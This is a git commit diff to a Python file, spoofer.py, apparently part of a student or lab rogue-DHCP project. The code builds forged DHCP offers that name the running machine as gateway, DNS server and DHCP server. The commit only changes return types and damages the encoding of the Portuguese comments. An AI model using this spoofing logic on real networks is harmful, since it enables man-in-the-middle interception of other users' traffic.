f8bd51d6e2d5c918f51494a558e480bc3e537d63
grpanho <grpanho@hotmail.com>
2022-11-07 16:06:24 -0300

    returns ajustados

--- spoofer.py
+++ spoofer.py
@@ -3,7 +3,7 @@ import netifaces as netif
 import ipaddress as ip
 from typing import Dict
 from collections.abc import Mapping 
-import time #temporário
+import time #temporï¿½rio
 
 class Spoofer:
 
@@ -18,12 +18,12 @@ class Spoofer:
         if inBytes:
             return s.inet_aton(ipaddr)
     
-        return ipaddr
+        return str(ipaddr)
 
     @staticmethod    
     def getNetmask(inBytes = False): # https://stackoverflow.com/a/54074160
         for iface in netif.interfaces():
-            time.sleep(1) # temporário, se não tiver sleep e fizer dhclient -r na mesma máquina que roda o programa, o IP não é configurado a tempo e não da pra pegar a máscara
+            time.sleep(1) # temporï¿½rio, se nï¿½o tiver sleep e fizer dhclient -r na mesma mï¿½quina que roda o programa, o IP nï¿½o ï¿½ configurado a tempo e nï¿½o da pra pegar a mï¿½scara
             addresses = netif.ifaddresses(iface)
 
             if 2 in addresses.keys():
@@ -33,19 +33,19 @@ class Spoofer:
         if inBytes:
             return s.inet_aton(mask)
 
-        return mask
+        return str(mask)
     
     @staticmethod
     def write_offer(dhcp_offer_header : Dict):
         print(dhcp_offer_header)
         dhcp_offer_header['op']     =   2
-        dhcp_offer_header['yiaddr'] =   s.inet_aton('10.132.249.253')
-        dhcp_offer_header[1]        =   {'length': 4, 'res': Spoofer.getNetmask(True)}  # ok
-        dhcp_offer_header[3]        =   {'length': 4, 'res': Spoofer.getIP(True)}       # ok
-        dhcp_offer_header[6]        =   {'length': 4, 'res': Spoofer.getIP(True)}       # ok
+        dhcp_offer_header['yiaddr'] =   "10.132.249.253" #s.inet_aton('10.132.249.253')
+        dhcp_offer_header[1]        =   {'length': 4, 'res': Spoofer.getNetmask()}  # ok
+        dhcp_offer_header[3]        =   {'length': 4, 'res': Spoofer.getIP()}       # ok
+        dhcp_offer_header[6]        =   {'length': 4, 'res': Spoofer.getIP()}       # ok
         dhcp_offer_header[51]       =   {'length': 4, 'res': 3600}                      # ok
         dhcp_offer_header[53]       =   {'length': 1, 'res': 0x2}                       # ok  
-        dhcp_offer_header[54]       =   {'length': 4, 'res': Spoofer.getIP(True)}       # ok
+        dhcp_offer_header[54]       =   {'length': 4, 'res': Spoofer.getIP()}       # ok
         dhcp_offer_header[58]       =   {'length': 4, 'res': 1800}                      # ok
         dhcp_offer_header[59]       =   {'length': 4, 'res': 3150}                      # ok 
         dhcp_offer_header[0]        =   {'length': 4, 'res': 0x00000}           
